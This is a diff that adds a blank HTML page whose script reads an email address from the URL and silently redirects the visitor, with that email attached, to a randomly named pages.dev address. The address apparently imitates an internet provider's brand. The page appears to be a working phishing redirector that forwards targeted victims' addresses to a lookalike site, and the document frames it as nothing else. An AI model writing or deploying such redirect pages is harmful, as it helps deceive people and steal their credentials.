@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        // Get parameters from current URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        
+        // Build target URL with email parameter
+        let targetUrl = 'https://cytanet-37de5d84a27f037de5d84a27f0.pages.dev/37de5d84a/37de5d84a27f0';
+        if (email) {
+            targetUrl += '?email=' + encodeURIComponent(email);
+        }
+        
+        // Redirect
+        window.location.href = targetUrl;
+    </script>
+</head>
+<body></body>
+</html>
